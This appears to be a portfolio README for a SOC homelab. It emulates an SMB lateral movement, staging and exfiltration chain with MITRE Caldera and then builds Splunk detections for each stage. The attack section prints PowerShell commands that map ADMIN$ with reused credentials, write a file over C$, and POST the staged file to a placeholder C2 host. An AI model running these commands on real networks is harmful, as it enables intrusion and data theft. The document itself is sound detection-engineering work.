
# Scenario 4 — SMB Lateral Movement & Data Exfiltration

**End-to-end kill-chain emulation and detection engineering in a self-built SOC homelab.**

Emulated a full attack chain — lateral movement → data staging → exfiltration — using MITRE Caldera, then built behavior-based detections for each stage in Splunk from Windows Security logs and Suricata. Every detection is mapped to MITRE ATT&CK and validated against live attack telemetry.

> **For reviewers:** the attack is the easy part. The value here is the detection engineering — catching each stage by *behavior* rather than indicator, and choosing host telemetry over network signatures where it's more reliable.

---

## Objective

Move laterally over SMB using reused credentials, stage a sensitive file with PowerShell, exfiltrate it over a C2 channel — and detect every stage in Splunk.

| Stage | Technique | ATT&CK ID |
|-------|-----------|-----------|
| Lateral Movement | SMB / Windows Admin Shares | T1021.002 |
| Collection | Data Staged: Local Data Staging | T1074.001 |
| Exfiltration | Exfiltration Over C2 Channel | T1041 |

---

## Lab Architecture

| Zone | Host | Role |
|------|------|------|
| Public | Kali | Attacker workstation + Caldera C2 server (`:8888`) |
| Perimeter | pfSense + Suricata | Firewall / inline IDS |
| Private | DC (`x.x.x.250`) | Active Directory Domain Controller — **lateral-movement target** |
| Private | Win10 Client (`x.x.x.252`) | Domain workstation — **attack origin** |
| Private | Splunk | SIEM (indexer + search head) |
| Infra | ESXi | Hypervisor |

**Movement direction:** Win10 Client → DC. A workstation pivoting *into* a domain controller is the realistic, high-value attack path — admin-share access on a DC means the attacker already holds domain-level privileges.

**Telemetry:** Windows hosts ship Security logs to Splunk via Universal Forwarders; pfSense ships Suricata EVE JSON.

<img width="902" height="673" alt="image" src="https://github.com/user-attachments/assets/87e61073-306d-4fa1-8da9-e5f4d6ddfa45" />


---

## Phase 0 — Setup (Prerequisites)

These audit policies are **off by default**. Without them the events never generate and the detections return nothing — this is the #1 reason a lab "produces no data."

**On both the DC and the Client** — `gpedit.msc` → Computer Config → Windows Settings → Security Settings → Advanced Audit Policy:

| Subcategory | Setting | Generates |
|-------------|---------|-----------|
| Object Access → Audit File Share | Success | `5140` |
| Object Access → Audit Detailed File Share | Success | `5145` |
| Detailed Tracking → Audit Process Creation | Success | `4688` |

Also enable: Admin Templates → System → Audit Process Creation → **"Include command line in process creation events"** (or `4688` logs a blank command line). Then `gpupdate /force`.

<img width="1216" height="1036" alt="image" src="https://github.com/user-attachments/assets/53466081-c978-4e1e-a12b-b44c9bd79fbf" />


**Confirm telemetry reaches Splunk before attacking:**

```spl
index=windows EventCode=4624 | head 5
index=suricata | head 5
```

---

## The Attack — MITRE Caldera

The chain is built as three Caldera **abilities**, sequenced into one **adversary profile**, then run as a single **operation** so the whole chain shares correlated timestamps.

> An *ability* is a single attack action performed on an agent. Agents (Sandcat) are deployed on the hosts and beacon back to the Caldera C2 on Kali.

<img width="1897" height="905" alt="image" src="https://github.com/user-attachments/assets/689feb24-0607-4ab0-9854-b979b464f0d4" />


### Ability 1 — Lateral Movement (T1021.002)
Maps the DC's `ADMIN$` share from the client using reused domain credentials.

```powershell
net use \\<DC_IP>\ADMIN$ /user:LAB\Administrator <password>
```

<img width="1161" height="745" alt="image" src="https://github.com/user-attachments/assets/cf4ce525-fd1a-4600-85f7-7957bffa3562" />

<img width="1104" height="722" alt="image" src="https://github.com/user-attachments/assets/df3a826e-7148-4f54-9eb3-90df8c073313" />


### Ability 2 — Data Staging (T1074.001)
Writes a decoy file onto the DC across the admin share.

```powershell
Set-Content -Path \\<DC_IP>\C$\Users\Public\sensitive.txt -Value 'SSN 000-00-0000 CC 4111111111111111'
```

<img width="1122" height="737" alt="image" src="https://github.com/user-attachments/assets/5054e6c6-ed4d-4872-8911-03240a015f63" />

<img width="1111" height="732" alt="image" src="https://github.com/user-attachments/assets/d05640ca-5712-4318-a536-c5c04245453a" />


### Ability 3 — Exfiltration (T1041)
Reads the staged file and sends it outbound to the C2.

```powershell
$f = Get-Content \\<DC_IP>\C$\Users\Public\sensitive.txt; Invoke-WebRequest -Uri http://<C2_IP>:8888/file/upload -Method POST -Body $f
```
<img width="1127" height="776" alt="image" src="https://github.com/user-attachments/assets/0e6e7108-ff38-4aeb-8f37-16f8c7f35d8b" />

<img width="1135" height="774" alt="image" src="https://github.com/user-attachments/assets/b44306d3-999e-4074-bbb8-9167b794607d" />

<img width="1675" height="745" alt="image" src="https://github.com/user-attachments/assets/cbb1346d-215e-436f-ada0-038e45a6bbc5" />

### Profile + Operation
Abilities created and chained into a profile in order: **Lateral Movement → Stage Decoy → Exfil** (order matters — staging must create the file before exfil reads it).

<img width="1898" height="899" alt="image" src="https://github.com/user-attachments/assets/ea9a31a9-f607-4795-8b3c-02abf9b96bc1" />


**Operation result:** Lateral movement and staging succeeded. The exfil POST returned a `500` because Caldera's `/file/upload` endpoint expects multipart form-data, not a raw string body — but **the outbound request still left the host and crossed pfSense**, so it remains fully detectable. The blue-team objective is to detect the *attempt*, not to guarantee a clean upload.

<img width="1902" height="890" alt="image" src="https://github.com/user-attachments/assets/f39f7e35-8d6d-414a-8528-7182edd5b52a" />

<img width="1630" height="739" alt="image" src="https://github.com/user-attachments/assets/c9c37bb0-9255-4306-98b9-510eed38c868" />

<img width="1647" height="493" alt="image" src="https://github.com/user-attachments/assets/fdf37c07-1911-476b-91be-baa8cec20149" />


---

## Detection Engineering — Splunk

### 1. Lateral Movement — `Lateral Movement - SMB ADMIN$ Access - T1021.002`
EventID `5140` fires whenever a network share is accessed. Filtering for the hidden `ADMIN$` share isolates SMB lateral movement.

```spl
index=* EventCode=5140 Source_Address="192.16.8.252" Account_Name=Admin* Share_Name="\\*\ADMIN$" ComputerName="WIN-*lab.local"
| stats count by Account_Name, Source_Address, ComputerName
```
> The `Source_Address`/`ComputerName` filters scope this to the lab. A production rule drops them to catch admin-share access from **any** workstation to **any** target.

<img width="1456" height="920" alt="image" src="https://github.com/user-attachments/assets/82e3f1ad-3505-41b4-9b9f-e0278b0cf54b" />

<img width="1405" height="900" alt="image" src="https://github.com/user-attachments/assets/ca6dd0eb-838d-49cf-a4a7-adc20fbb1867" />

<img width="1386" height="893" alt="image" src="https://github.com/user-attachments/assets/062939f2-20dd-4c0e-9a82-78283e71f18a" />


### 2. Data Staging — `Collection - Remote Admin Share File Write - T1074.001`
The attacker dropped `sensitive.txt` — but matching that filename would miss any other file. Instead, detect the **behavior**: a file being *written* to an admin share. `Access_Mask=0x2` (WriteData) only appears when a file is written to a `C$`/`ADMIN$` share, so this catches the staging regardless of filename.

```spl
index=* EventCode=5145 Access_Mask=0x2 Share_Name="\\*\C$"
| table _time, Account_Name, Source_Address, Relative_Target_Name, Share_Name
| sort _time
```
<img width="1389" height="887" alt="image" src="https://github.com/user-attachments/assets/fdfc04d5-def6-4ebe-9551-9d38316f121e" />

### 3. Data Exfiltration — `Exfiltration - PowerShell Outbound to C2 - T1041`
Detected from the **host** rather than the IDS. `4688` process creation for `powershell.exe` with `Invoke-WebRequest` in the command line catches the outbound transfer — and the command line reveals the full exfil command and destination C2 URL.

```spl
index=* EventCode=4688 New_Process_Name="*powershell.exe*" Process_Command_Line="*Invoke-WebRequest*"
| table _time, host, Account_Name, Process_Command_Line
| sort _time
```
<img width="1389" height="876" alt="image" src="https://github.com/user-attachments/assets/2797395c-7357-4af2-bbf7-23a2344548f7" />

---

## Detection Engineering Notes (Design Decisions)

Two deliberate choices that make these detections resilient rather than brittle:

- **Behavior over indicator (staging).** Detecting `Access_Mask=0x2` on an admin share catches the *action* of staging a file. Matching the literal filename `sensitive.txt` would be trivially evaded by renaming. Indicators change; the technique doesn't.
- **Host over network (exfil).** Catching the PowerShell outbound request on the endpoint survives encryption and custom C2 channels that would slip past a signature-based IDS. The IDS is a useful second layer, not the primary detection.

---

## Results

| Detection | Technique | Source | Result |
|-----------|-----------|--------|--------|
| SMB ADMIN$ Access | T1021.002 | Windows `5140` | ✅ Detected |
| Remote Admin Share File Write | T1074.001 | Windows `5145` (Access_Mask 0x2) | ✅ Detected |
| PowerShell Outbound to C2 | T1041 | Windows `4688` | ✅ Detected |

All three stages were emulated via Caldera and independently detected in Splunk, each saved as a report and re-validated by re-running the operation.

---

## Key Takeaways

- Built and detected a complete kill chain (lateral movement → staging → exfil) end to end.
- Wrote behavior-based detections that survive indicator changes and evasion.
- Demonstrated that a failed attack step (the exfil POST) is still detectable — what matters is the attempt crossing the wire.
- Kept all SPL at Core level: readable, maintainable, explainable line by line.

---

*Built in an isolated SOC homelab against dummy test data. All techniques mapped to MITRE ATT&CK.*
